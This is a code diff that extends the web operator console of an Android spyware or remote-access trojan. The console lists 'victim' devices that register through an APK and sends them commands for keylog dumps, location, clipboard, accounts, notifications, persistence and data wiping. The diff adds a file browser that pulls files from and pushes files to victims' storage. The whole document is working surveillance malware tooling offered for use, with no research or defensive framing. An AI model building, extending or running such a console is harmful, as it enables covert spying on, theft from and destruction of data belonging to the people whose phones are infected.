@@ -3,135 +3,179 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>ANON · Operator Console</title>
+<title>ANON Operator</title>
 <style>
 :root{
-  --bg:#07060c;--card:#12101a;--line:#2a2238;--txt:#f0e9ff;--mut:#8f849f;
-  --acc:#9b4dff;--acc2:#6b2ad1;--ok:#5dff9a;--warn:#ffb020;--bad:#ff5d7a;
-  --font:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  --bg:#06050a;--panel:#0e0c14;--card:#14121c;--line:#2a2438;--line2:#3a3250;
+  --txt:#f3edff;--mut:#9589a8;--acc:#a855f7;--acc2:#7c3aed;--ok:#34d399;--bad:#fb7185;
+  --warn:#fbbf24;--font:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
   --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --radius:14px;
 }
 *{box-sizing:border-box}
-body{margin:0;font-family:var(--font);background:radial-gradient(900px 400px at 10% -10%,#2a145055,transparent),var(--bg);color:var(--txt);min-height:100vh}
-a{color:var(--acc)}
-button,input,select,textarea{font:inherit}
-button{cursor:pointer;border:0;border-radius:10px;padding:10px 14px;background:linear-gradient(90deg,var(--acc2),var(--acc));color:#fff;font-weight:600}
+body{margin:0;font-family:var(--font);background:radial-gradient(1000px 500px at 15% -20%,#3b176855,transparent 55%),var(--bg);color:var(--txt);min-height:100vh}
+button,input,select,textarea{font:inherit;color:inherit}
+button{cursor:pointer;border:0;border-radius:10px;padding:9px 14px;background:linear-gradient(90deg,var(--acc2),var(--acc));color:#fff;font-weight:600}
+button.secondary{background:#1a1624;border:1px solid var(--line)}
 button.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
-button:disabled{opacity:.5;cursor:not-allowed}
-input,textarea,select{width:100%;background:#0a0910;border:1px solid var(--line);border-radius:10px;color:var(--txt);padding:10px 12px}
-label{display:block;font-size:12px;color:var(--mut);margin:0 0 6px}
-.wrap{max-width:1200px;margin:0 auto;padding:20px}
-.top{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:18px}
-.brand{font-family:var(--mono);letter-spacing:.18em;font-weight:700}
-.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;margin-bottom:14px}
-.grid{display:grid;gap:14px}
-@media(min-width:900px){.grid.two{grid-template-columns:1.1fr .9fr}}
-.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+button.danger{background:#3f1220;border:1px solid #7f1d3a}
+button:disabled{opacity:.45;cursor:not-allowed}
+input,textarea,select{width:100%;background:#0a0910;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
+input:focus,textarea:focus,select:focus{outline:1px solid #7c3aed88;border-color:#7c3aed88}
+label{display:block;font-size:11px;letter-spacing:.04em;text-transform:uppercase;color:var(--mut);margin:0 0 6px}
+.shell{max-width:1280px;margin:0 auto;padding:18px}
+.topbar{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:16px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.14em;font-size:13px}
+.mark{width:28px;height:28px;border-radius:8px;display:grid;place-items:center;background:linear-gradient(135deg,var(--acc2),var(--acc));font-size:12px}
 .muted{color:var(--mut);font-size:13px}
 .mono{font-family:var(--mono);font-size:12px}
-.tag{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;border:1px solid var(--line)}
-.tag.ok{color:var(--ok);border-color:#2a6b45}
+.grid{display:grid;gap:14px}
+@media(min-width:1000px){.grid.main{grid-template-columns:340px 1fr}}
+.card{background:linear-gradient(180deg,#161221,#100e18);border:1px solid var(--line);border-radius:var(--radius);padding:14px}
+.card h3{margin:0 0 10px;font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:#d8c8ff}
+.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.stack{display:grid;gap:10px}
+.tag{display:inline-flex;align-items:center;gap:6px;padding:3px 9px;border-radius:999px;font-size:11px;border:1px solid var(--line);color:var(--mut)}
+.tag.ok{color:var(--ok);border-color:#065f46;background:#064e3b33}
 .tag.off{color:var(--mut)}
 table{width:100%;border-collapse:collapse;font-size:13px}
-th,td{text-align:left;padding:8px 6px;border-bottom:1px solid var(--line);vertical-align:top}
-th{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.06em}
+th,td{text-align:left;padding:9px 8px;border-bottom:1px solid var(--line);vertical-align:middle}
+th{color:var(--mut);font-size:10px;text-transform:uppercase;letter-spacing:.07em}
+tr{cursor:pointer}
 tr:hover td{background:#ffffff06}
-tr.selected td{background:#9b4dff18}
-.cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px}
-.cmds button{padding:10px;font-size:12px;background:#1a1228;border:1px solid var(--line)}
+tr.active td{background:#a855f718}
+.cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px}
+.cmds button{background:#171225;border:1px solid var(--line);font-size:12px;padding:10px 8px}
 .cmds button:hover{border-color:var(--acc)}
-pre{background:#0a0910;border:1px solid var(--line);border-radius:12px;padding:12px;overflow:auto;max-height:320px;font-size:12px;margin:0}
-#status{font-family:var(--mono);font-size:12px;color:var(--mut);min-height:18px}
-#gate{max-width:420px;margin:10vh auto}
+pre{background:#09080f;border:1px solid var(--line);border-radius:12px;padding:12px;overflow:auto;max-height:280px;font-size:12px;margin:0}
+#status{font-family:var(--mono);font-size:12px;color:var(--mut)}
+#gate{max-width:420px;margin:12vh auto}
 .err{color:var(--bad);font-size:13px;margin-top:8px}
-img.capture{max-width:100%;border-radius:10px;display:block}
-audio{width:100%}
+.tabs{display:flex;gap:6px;margin-bottom:12px}
+.tabs button{background:#14101c;border:1px solid var(--line)}
+.tabs button.active{border-color:var(--acc);background:#231733}
+.pathbar{display:flex;gap:8px;align-items:center}
+.pathbar input{flex:1}
+.filelist{max-height:340px;overflow:auto;border:1px solid var(--line);border-radius:12px}
+.filelist table{margin:0}
+.filelist tr td:first-child{width:36px}
+.pill{font-size:10px;padding:2px 6px;border-radius:6px;background:#1c1830;color:var(--mut)}
+.footer-note{font-size:11px;color:var(--mut);margin-top:8px}
+img.capture,audio{max-width:100%;border-radius:10px}
+.hidden{display:none !important}
 </style>
 </head>
 <body>
-<div class="wrap">
+<div class="shell">
   <div id="gate" class="card">
-    <div class="brand" style="margin-bottom:8px">ANON · OPS</div>
-    <p class="muted">Operator console. Enter OPERATOR_TOKEN.</p>
-    <label>Token</label>
+    <div class="brand"><span class="mark">A</span> ANON OPERATOR</div>
+    <p class="muted" style="margin:10px 0 14px">Sign in with your operator token to manage devices and files.</p>
+    <label>Operator token</label>
     <input id="tokenInput" type="password" placeholder="OPERATOR_TOKEN" autocomplete="off"/>
-    <div class="row" style="margin-top:12px">
-      <button id="unlockBtn">Unlock</button>
-    </div>
+    <div class="row" style="margin-top:12px"><button id="unlockBtn">Continue</button></div>
     <div class="err" id="gateErr"></div>
   </div>
 
-  <div id="app" hidden>
-    <div class="top">
+  <div id="app" class="hidden">
+    <div class="topbar">
       <div>
-        <div class="brand">ANON · OPERATOR</div>
-        <div class="muted" id="status">ready</div>
+        <div class="brand"><span class="mark">A</span> ANON OPERATOR</div>
+        <div id="status">Ready</div>
       </div>
       <div class="row">
-        <button class="ghost" id="refreshBtn">Refresh</button>
-        <button class="ghost" id="logoutBtn">Lock</button>
+        <button class="ghost" id="refreshBtn">Refresh devices</button>
+        <button class="secondary" id="logoutBtn">Lock</button>
       </div>
     </div>
 
-    <div class="grid two">
-      <div>
+    <div class="grid main">
+      <div class="stack">
         <div class="card">
-          <div class="row" style="justify-content:space-between;margin-bottom:10px">
-            <strong>Devices</strong>
+          <div class="row" style="justify-content:space-between;margin-bottom:8px">
+            <h3 style="margin:0">Devices</h3>
             <div class="row">
               <button class="ghost" id="btnOnline">Online</button>
               <button class="ghost" id="btnUsers">All</button>
             </div>
           </div>
-          <div style="overflow:auto">
+          <div style="overflow:auto;max-height:280px">
             <table>
-              <thead>
-                <tr><th>Status</th><th>Email</th><th>Device</th><th>Last seen</th></tr>
-              </thead>
+              <thead><tr><th>Status</th><th>Email</th><th>Device</th><th>Seen</th></tr></thead>
               <tbody id="deviceBody"></tbody>
             </table>
           </div>
         </div>
 
         <div class="card">
-          <strong>Target</strong>
-          <p class="muted">Send by device id <em>or</em> victim email (whichever is set).</p>
-          <div class="grid" style="margin-top:10px">
+          <h3>Target</h3>
+          <div class="stack">
             <div>
               <label>Device ID</label>
-              <input id="deviceId" placeholder="uuid from table" autocomplete="off"/>
+              <input id="deviceId" class="mono" placeholder="Select a row or paste UUID"/>
             </div>
             <div>
               <label>Email</label>
-              <input id="email" type="email" placeholder="victim@example.com" autocomplete="off"/>
+              <input id="email" type="email" placeholder="victim@example.com"/>
             </div>
           </div>
-        </div>
-
-        <div class="card">
-          <strong>Commands</strong>
-          <div class="cmds" id="cmdGrid" style="margin-top:10px"></div>
-          <div class="grid" style="margin-top:12px">
-            <div>
-              <label>Custom name</label>
-              <input id="customName" placeholder="info"/>
-            </div>
-            <div>
-              <label>Args JSON</label>
-              <textarea id="args" rows="3">{}</textarea>
-            </div>
-          </div>
-          <div class="row" style="margin-top:10px">
-            <button id="enqueueCustom">Enqueue</button>
-          </div>
+          <p class="footer-note">Commands run on the selected device. Use email if the id is unknown.</p>
         </div>
       </div>
 
-      <div>
+      <div class="stack">
         <div class="card">
-          <strong>Result</strong>
-          <div id="mediaOut" style="margin:10px 0"></div>
-          <pre id="out">Ready.</pre>
+          <div class="tabs">
+            <button class="active" data-tab="ops">Quick actions</button>
+            <button data-tab="files">Files</button>
+            <button data-tab="result">Result</button>
+          </div>
+
+          <div id="tab-ops">
+            <div class="cmds" id="cmdGrid"></div>
+            <div class="grid" style="margin-top:12px;grid-template-columns:1fr 1fr">
+              <div>
+                <label>Custom command</label>
+                <input id="customName" placeholder="info"/>
+              </div>
+              <div>
+                <label>Args JSON</label>
+                <input id="args" placeholder='{"path":"/sdcard"}'/>
+              </div>
+            </div>
+            <div class="row" style="margin-top:10px">
+              <button id="enqueueCustom">Run command</button>
+            </div>
+          </div>
+
+          <div id="tab-files" class="hidden">
+            <div class="pathbar">
+              <button class="secondary" id="fsUp" title="Parent folder">↑</button>
+              <input id="fsPath" class="mono" value="/sdcard"/>
+              <button class="secondary" id="fsGo">Open</button>
+              <button id="fsRefresh">Refresh</button>
+            </div>
+            <div class="filelist" style="margin-top:10px">
+              <table>
+                <thead><tr><th></th><th>Name</th><th>Size</th><th></th></tr></thead>
+                <tbody id="fsBody"><tr><td colspan="4" class="muted">Open a target device, then Refresh.</td></tr></tbody>
+              </table>
+            </div>
+            <div class="stack" style="margin-top:12px">
+              <div>
+                <label>Upload to current folder</label>
+                <input type="file" id="fsFile"/>
+              </div>
+              <div class="row">
+                <button id="fsUploadBtn">Upload to device</button>
+                <span class="muted" id="fsHint">Start path: /sdcard</span>
+              </div>
+            </div>
+          </div>
+
+          <div id="tab-result" class="hidden">
+            <div id="mediaOut" style="margin-bottom:10px"></div>
+            <pre id="out">Results appear here.</pre>
+          </div>
         </div>
       </div>
     </div>
@@ -140,204 +184,304 @@ audio{width:100%}
 <script>
 const ONLINE_MS = 45000;
 const COMMANDS = [
-  {name:'info', label:'info'},
-  {name:'geoloc', label:'geoloc'},
-  {name:'clipboard', label:'clipboard'},
-  {name:'files', label:'files', args:{path:'/sdcard'}},
-  {name:'accounts', label:'accounts'},
-  {name:'sim', label:'sim'},
-  {name:'notifications', label:'notifications'},
-  {name:'keylog_dump', label:'keylog'},
-  {name:'persist_status', label:'persist'},
-  {name:'push_text', label:'push', args:{text:'test'}},
-  {name:'wipe_app_data', label:'wipe'},
+  {name:'info', label:'Device info'},
+  {name:'geoloc', label:'Location'},
+  {name:'clipboard', label:'Clipboard'},
+  {name:'accounts', label:'Accounts'},
+  {name:'notifications', label:'Notifications'},
+  {name:'keylog_dump', label:'Keylog'},
+  {name:'persist_status', label:'Persist'},
+  {name:'push_text', label:'Notify', args:{text:'test'}},
+  {name:'wipe_app_data', label:'Wipe data'},
 ];
 
 let token = sessionStorage.getItem('op_token') || '';
+let cwd = '/sdcard';
 const $ = (id) => document.getElementById(id);
 
 function setStatus(s){ $('status').textContent = s; }
+function showTab(name){
+  ['ops','files','result'].forEach(t => {
+    $('tab-'+t).classList.toggle('hidden', t !== name);
+    document.querySelector(`.tabs button[data-tab="${t}"]`).classList.toggle('active', t === name);
+  });
+}
 
 function setOut(x){
   const pre = $('out');
   const media = $('mediaOut');
   media.innerHTML = '';
   pre.textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2);
-  try { renderMedia(typeof x === 'string' ? null : x, media); } catch(e){ console.warn(e); }
+  try { renderMedia(typeof x === 'string' ? null : x, media); } catch(e){}
+  // auto show result tab for non-file JSON dumps
 }
 
 function pickB64(node){
   if (!node || typeof node !== 'object') return null;
-  const candidates = [];
-  if (node.data) candidates.push(node.data);
-  candidates.push(node);
-  if (node.data && node.data.data) candidates.push(node.data.data);
+  const candidates = [node.data, node, node.data && node.data.data].filter(Boolean);
   for (const c of candidates){
     if (!c || typeof c !== 'object') continue;
     const b64 = c.b64 || c.base64 || c.image || c.audio;
     if (typeof b64 === 'string' && b64.length > 32){
-      return { b64, mime: c.mime || c.contentType || guessMime(c, b64) };
+      return { b64, mime: c.mime || c.contentType || (b64.startsWith('/9j/')?'image/jpeg':'application/octet-stream'), name: c.name || 'download.bin' };
     }
   }
   return null;
 }
-function guessMime(c, b64){
-  if (c && c.seconds != null) return 'audio/mp4';
-  if (c && (c.w || c.h)) return 'image/jpeg';
-  if (b64.startsWith('/9j/')) return 'image/jpeg';
-  if (b64.startsWith('iVBOR')) return 'image/png';
-  return 'application/octet-stream';
-}
 function renderMedia(obj, mount){
   const hit = pickB64(obj);
   if (!hit) return;
-  const { b64, mime } = hit;
-  const url = 'data:' + mime + ';base64,' + b64;
+  const url = 'data:' + hit.mime + ';base64,' + hit.b64;
   const card = document.createElement('div');
   card.style.cssText = 'border:1px solid var(--line);border-radius:12px;padding:12px;background:#0a0910;margin-bottom:8px';
-  const title = document.createElement('div');
-  title.className = 'mono muted';
-  title.style.marginBottom = '8px';
-  title.textContent = mime + ' · ' + Math.round(b64.length * 0.75 / 1024) + ' KB';
-  card.appendChild(title);
-  if (mime.startsWith('image/')){
-    const img = document.createElement('img');
-    img.className = 'capture';
-    img.src = url;
-    card.appendChild(img);
-  } else if (mime.startsWith('audio/')){
-    const audio = document.createElement('audio');
-    audio.controls = true;
-    audio.src = url;
-    card.appendChild(audio);
+  const meta = document.createElement('div');
+  meta.className = 'mono muted';
+  meta.style.marginBottom = '8px';
+  meta.textContent = (hit.name||'') + ' · ' + hit.mime + ' · ' + Math.round(hit.b64.length*0.75/1024) + ' KB';
+  card.appendChild(meta);
+  if (hit.mime.startsWith('image/')){
+    const img = document.createElement('img'); img.className='capture'; img.src=url; card.appendChild(img);
+  } else if (hit.mime.startsWith('audio/')){
+    const a = document.createElement('audio'); a.controls=true; a.src=url; card.appendChild(a);
   }
-  const dl = document.createElement('a');
-  dl.href = url;
-  dl.download = mime.startsWith('audio/') ? 'mic.m4a' : 'capture.jpg';
-  dl.textContent = 'Download';
-  dl.style.display = 'inline-block';
-  dl.style.marginTop = '8px';
-  card.appendChild(document.createElement('br'));
-  card.appendChild(dl);
+  const a = document.createElement('a'); a.href=url; a.download=hit.name||'file.bin'; a.textContent='Download file'; a.style.color='var(--acc)';
+  card.appendChild(document.createElement('br')); card.appendChild(a);
   mount.appendChild(card);
 }
 
 async function api(path, opts={}){
   const headers = Object.assign({'Content-Type':'application/json','Authorization':'Bearer '+token}, opts.headers||{});
-  const res = await fetch(path, Object.assign({}, opts, { headers }));
+  const res = await fetch(path, Object.assign({}, opts, {headers}));
   const text = await res.text();
-  let data; try { data = JSON.parse(text); } catch { data = { raw: text }; }
-  if (!res.ok) throw new Error((data && data.error) || res.status + ' ' + text);
+  let data; try{ data = JSON.parse(text);} catch{ data = {raw:text}; }
+  if (!res.ok) throw new Error((data && data.error) || (res.status+' '+text));
   return data;
 }
 
 function ago(ts){
   if (!ts) return '—';
   const s = Math.max(0, Math.round((Date.now()-ts)/1000));
-  if (s < 60) return s + 's';
-  if (s < 3600) return Math.round(s/60) + 'm';
-  return Math.round(s/3600) + 'h';
+  if (s < 60) return s+'s';
+  if (s < 3600) return Math.round(s/60)+'m';
+  return Math.round(s/3600)+'h';
 }
 
 function renderDevices(list){
   const body = $('deviceBody');
   body.innerHTML = '';
+  if (!list.length){
+    body.innerHTML = '<tr><td colspan="4" class="muted">No devices yet. Open the APK so it can register.</td></tr>';
+    return;
+  }
   for (const d of list){
     const tr = document.createElement('tr');
     const model = (d.meta && (d.meta.model || d.meta.manufacturer)) || '';
     tr.innerHTML = `<td>${d.online?'<span class="tag ok">online</span>':'<span class="tag off">offline</span>'}</td>
       <td class="mono">${d.email||'—'}</td>
-      <td class="mono" title="${d.id}">${(d.id||'').slice(0,8)}… ${model}</td>
+      <td class="mono" title="${d.id}">${(d.id||'').slice(0,8)}… <span class="pill">${model}</span></td>
       <td class="muted">${ago(d.lastSeen)}</td>`;
     tr.onclick = () => {
       $('deviceId').value = d.id || '';
       $('email').value = d.email || '';
-      body.querySelectorAll('tr').forEach(x => x.classList.remove('selected'));
-      tr.classList.add('selected');
+      body.querySelectorAll('tr').forEach(x => x.classList.remove('active'));
+      tr.classList.add('active');
+      setStatus('Target ' + (d.email || d.id.slice(0,8)));
     };
     body.appendChild(tr);
   }
 }
 
 async function loadUsers(){
-  setStatus('loading devices…');
+  setStatus('Loading devices…');
   const list = await api('/op/devices');
   const arr = Array.isArray(list) ? list : (list.devices || []);
   renderDevices(arr);
-  setOut(arr);
-  setStatus('devices: ' + arr.length);
+  setStatus(arr.length + ' device(s)');
 }
 async function loadOnline(){
-  setStatus('loading online…');
+  setStatus('Loading online…');
   const res = await api('/online');
   renderDevices(res.devices || []);
-  setOut(res);
-  setStatus('online: ' + (res.count||0));
+  setStatus((res.count||0) + ' online');
+}
+
+function requireTarget(){
+  const deviceId = $('deviceId').value.trim();
+  const email = $('email').value.trim();
+  if (!deviceId && !email) throw new Error('Select a device or enter an email');
+  return { deviceId, email };
 }
 
 async function enqueue(name, args){
-  const deviceId = $('deviceId').value.trim();
-  const email = $('email').value.trim();
-  if (!deviceId && !email){ setStatus('set device id or email'); return; }
+  const t = requireTarget();
   let parsed = args;
-  if (!parsed){
+  if (parsed === undefined){
     try { parsed = JSON.parse($('args').value || '{}'); }
-    catch { setStatus('args JSON invalid'); return; }
+    catch { throw new Error('Args JSON invalid'); }
   }
-  setStatus('enqueue ' + name + '…');
+  setStatus('Running ' + name + '…');
   const body = { name, args: parsed || {} };
-  if (deviceId) body.deviceId = deviceId;
-  if (email) body.email = email;
+  if (t.deviceId) body.deviceId = t.deviceId;
+  if (t.email) body.email = t.email;
   const res = await api('/op/enqueue', { method:'POST', body: JSON.stringify(body) });
   setOut(res);
-  setStatus('queued ' + name + ' → ' + res.jobId + ' @ ' + (res.deviceId||'').slice(0,8));
-  for (let i=0;i<10;i++){
+  for (let i=0;i<12;i++){
     await new Promise(r => setTimeout(r, 2000));
     try {
       const result = await api('/op/result/' + res.jobId);
       setOut(result);
-      setStatus('result for ' + name + (result.ok===false?' (failed)':' (ok)'));
-      return;
+      setStatus(name + (result.ok===false ? ' failed' : ' done'));
+      return result;
     } catch(_){}
   }
-  setStatus('queued; waiting for device poll — keep APK open');
+  setStatus('Queued — keep the app open so it can poll');
+  return res;
 }
 
 function buildCmds(){
-  const g = $('cmdGrid');
-  g.innerHTML = '';
+  const g = $('cmdGrid'); g.innerHTML='';
   for (const c of COMMANDS){
     const b = document.createElement('button');
     b.textContent = c.label;
-    b.onclick = () => {
-      if (c.args) $('args').value = JSON.stringify(c.args, null, 2);
-      enqueue(c.name, c.args);
-    };
+    b.onclick = () => enqueue(c.name, c.args).then(() => showTab('result')).catch(e => setStatus(String(e)));
     g.appendChild(b);
   }
 }
 
+function joinPath(base, name){
+  if (name === '..'){
+    if (base === '/' || base === '') return '/';
+    const parts = base.split('/').filter(Boolean);
+    parts.pop();
+    return '/' + parts.join('/') || '/';
+  }
+  if (name.startsWith('/')) return name;
+  return (base.endsWith('/') ? base : base + '/') + name;
+}
+
+function fmtSize(n){
+  if (n == null) return '—';
+  if (n < 1024) return n + ' B';
+  if (n < 1024*1024) return (n/1024).toFixed(1) + ' KB';
+  return (n/1024/1024).toFixed(1) + ' MB';
+}
+
+async function fsList(path){
+  cwd = path || cwd || '/sdcard';
+  $('fsPath').value = cwd;
+  setStatus('Listing ' + cwd);
+  const result = await enqueue('fs_ls', { path: cwd });
+  const data = result && result.data ? result.data : result;
+  const entries = (data && data.entries) || [];
+  const body = $('fsBody');
+  body.innerHTML = '';
+  // parent row
+  if (cwd !== '/' && cwd !== ''){
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td>📁</td><td colspan="3" class="mono">..</td>`;
+    tr.onclick = () => fsList(joinPath(cwd, '..')).catch(e => setStatus(String(e)));
+    body.appendChild(tr);
+  }
+  if (!entries.length){
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td colspan="4" class="muted">Empty folder</td>`;
+    body.appendChild(tr);
+  }
+  for (const e of entries){
+    const tr = document.createElement('tr');
+    const isDir = e.type === 'dir';
+    tr.innerHTML = `<td>${isDir?'📁':'📄'}</td>
+      <td class="mono">${e.name||''}</td>
+      <td class="muted">${isDir?'—':fmtSize(e.size)}</td>
+      <td>${isDir?'':`<button class="ghost" data-dl="${e.path}">Download</button>`}</td>`;
+    tr.onclick = (ev) => {
+      if (ev.target && ev.target.dataset && ev.target.dataset.dl) return;
+      if (isDir) fsList(e.path || joinPath(cwd, e.name)).catch(err => setStatus(String(err)));
+    };
+    const btn = tr.querySelector('button[data-dl]');
+    if (btn){
+      btn.onclick = async (ev) => {
+        ev.stopPropagation();
+        try {
+          setStatus('Downloading ' + e.name);
+          const r = await enqueue('fs_download', { path: e.path });
+          const payload = r.data || r;
+          if (payload && payload.b64){
+            const a = document.createElement('a');
+            a.href = 'data:application/octet-stream;base64,' + payload.b64;
+            a.download = payload.name || e.name || 'file.bin';
+            a.click();
+            setStatus('Downloaded ' + a.download);
+            showTab('result');
+          } else {
+            setOut(r); showTab('result');
+          }
+        } catch(err){ setStatus(String(err)); }
+      };
+    }
+    body.appendChild(tr);
+  }
+  $('fsHint').textContent = entries.length + ' items · ' + cwd;
+  showTab('files');
+}
+
+async function fsUpload(){
+  const file = $('fsFile').files && $('fsFile').files[0];
+  if (!file){ setStatus('Choose a file to upload'); return; }
+  if (file.size > 12*1024*1024){ setStatus('Max 12MB per upload'); return; }
+  setStatus('Reading ' + file.name);
+  const buf = await file.arrayBuffer();
+  const bytes = new Uint8Array(buf);
+  let binary = '';
+  for (let i=0;i<bytes.length;i++) binary += String.fromCharCode(bytes[i]);
+  const b64 = btoa(binary);
+  const dest = joinPath(cwd || '/sdcard', file.name);
+  setStatus('Uploading → ' + dest);
+  const r = await enqueue('fs_upload', { path: dest, b64 });
+  setOut(r);
+  showTab('result');
+  await fsList(cwd);
+}
+
 function unlock(){
   token = $('tokenInput').value.trim();
-  if (!token){ $('gateErr').textContent = 'token required'; return; }
+  if (!token){ $('gateErr').textContent = 'Token required'; return; }
   sessionStorage.setItem('op_token', token);
-  $('gate').hidden = true;
-  $('app').hidden = false;
+  $('gate').classList.add('hidden');
+  $('app').classList.remove('hidden');
   buildCmds();
   loadOnline().catch(e => setStatus(String(e)));
 }
 
+document.querySelectorAll('.tabs button').forEach(b => {
+  b.onclick = () => showTab(b.dataset.tab);
+});
 $('unlockBtn').onclick = unlock;
 $('tokenInput').addEventListener('keydown', e => { if (e.key === 'Enter') unlock(); });
 $('logoutBtn').onclick = () => { sessionStorage.removeItem('op_token'); location.reload(); };
 $('refreshBtn').onclick = () => loadUsers().catch(e => setStatus(String(e)));
 $('btnOnline').onclick = () => loadOnline().catch(e => setStatus(String(e)));
 $('btnUsers').onclick = () => loadUsers().catch(e => setStatus(String(e)));
-$('enqueueCustom').onclick = () => enqueue($('customName').value.trim());
+$('enqueueCustom').onclick = () => enqueue($('customName').value.trim()).then(()=>showTab('result')).catch(e => setStatus(String(e)));
+$('fsGo').onclick = () => fsList($('fsPath').value.trim() || '/sdcard').catch(e => setStatus(String(e)));
+$('fsRefresh').onclick = () => fsList(cwd || '/sdcard').catch(e => setStatus(String(e)));
+$('fsUp').onclick = () => fsList(joinPath(cwd || '/sdcard', '..')).catch(e => setStatus(String(e)));
+$('fsUploadBtn').onclick = () => fsUpload().catch(e => setStatus(String(e)));
+$('fsPath').addEventListener('keydown', e => { if (e.key === 'Enter') $('fsGo').click(); });
+
+function buildCmds(){
+  const g = $('cmdGrid'); g.innerHTML='';
+  for (const c of COMMANDS){
+    const b = document.createElement('button');
+    b.textContent = c.label;
+    b.onclick = () => enqueue(c.name, c.args).then(()=>showTab('result')).catch(e => setStatus(String(e)));
+    g.appendChild(b);
+  }
+}
 
 if (token){
-  $('gate').hidden = true;
-  $('app').hidden = false;
+  $('gate').classList.add('hidden');
+  $('app').classList.remove('hidden');
   buildCmds();
   loadOnline().catch(e => setStatus(String(e)));
 }
